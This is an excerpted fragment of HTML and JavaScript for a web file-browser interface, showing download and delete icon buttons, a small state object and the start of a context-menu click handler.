        <button class="bulk-btn" id="bulkDl" title="Download selected">
            <svg viewBox="0 0 16 16">
                <path
                    ...
                    fill="currentColor" />
                <path
                    d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.5 3.5a.75.75 0 0 1-1.06 0l-3.5-3.5a.75.75 0 0 1 1.06-1.06l2.678 2.33Z"
                    fill="currentColor" />
            </svg>
            <span>Download</span>
        </button>
    ...
    <script>
        ...
        const API = '?api=1';
        const S = {
            path: '', entries: [], selected: new Set(), view: 'list',
  ...
  <button class="ico-btn del" data-a="delete" title="Delete"><svg viewBox="0 0 16 16"><path d="M6.5 1.75a.25.25 0 0 1 .25-.25h2.5a.25.25 0 0 1 .25.25V3h-3V1.75Zm4.5 0V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.748 1.748 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15Z" fill="currentColor"/></svg></button>
    ...
    <button class="ci danger" data-a="delete"><svg viewBox="0 0 16 16"><path d="M11 1.75V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75Z" fill="currentColor"/></svg>Delete</button>`;
            ...
            ctxEl.querySelectorAll('[data-a]').forEach(b => {
                b.onclick = () => {
                    ctxEl.classList.remove('open'); const a = b.dataset.a;
